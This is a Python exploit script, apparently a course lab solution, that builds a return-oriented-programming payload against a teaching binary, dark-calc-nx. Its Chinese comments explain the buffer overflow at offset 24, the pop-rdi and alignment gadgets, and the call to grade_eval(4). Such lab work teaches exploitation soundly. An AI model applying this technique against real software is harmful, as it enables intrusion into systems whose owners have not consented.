#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (ROP).

dark-calc-nx 栈不可执行且位置随机，但它是 Non-PIE，程序自身代码地址固定，
因此可用 ROP：复用已有指令片段（gadget）设置参数并调用 grade_eval(4)。

栈帧：expression 缓冲区位于 rbp-0x10，返回地址偏移 24。

ROP 链（低地址 -> 高地址，依次被 ret 串起）：
  0x401a33  pop rdi ; ret     -> 把下一个 qword 弹入 rdi
  0x4       -> rdi = 4         （grade_eval 的参数）
  0x401636  ret               -> 栈对齐：保证进入 grade_eval 时 rsp % 16 == 8
  0x401978  grade_eval        -> grade_eval(4) 打印 "Hope A will be your grade!"
"""
import struct
import sys

RET_OFFSET = 24
POP_RDI = 0x401a33              # pop rdi ; ret
RET_GADGET = 0x401636          # ret （对齐用）
GRADE_EVAL = 0x401978

payload = b"A" * RET_OFFSET
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", RET_GADGET)
payload += struct.pack("<Q", GRADE_EVAL)

sys.stdout.buffer.write(payload)
